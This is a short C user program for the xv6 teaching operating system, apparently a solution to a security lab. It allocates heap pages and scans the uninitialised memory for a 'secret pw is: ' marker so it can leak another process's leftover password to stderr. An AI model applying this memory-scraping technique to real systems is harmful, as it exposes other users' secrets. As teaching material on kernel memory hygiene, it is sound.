#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  char *buf = sbrk(PGSIZE * 32);
  if(buf == (char*)-1){
    fprintf(2, "attack: sbrk failed\n");
    exit(1);
  }

  const char *unique_part = "secret pw is: ";
  int part_len = strlen(unique_part);

  for (char *p = buf; p < buf + (PGSIZE * 32) - 40; p++) {

    if (memcmp(p, unique_part, part_len) == 0) {

      write(2, p + 14, 8);
      
      exit(0);
    }
  }

  exit(0);
}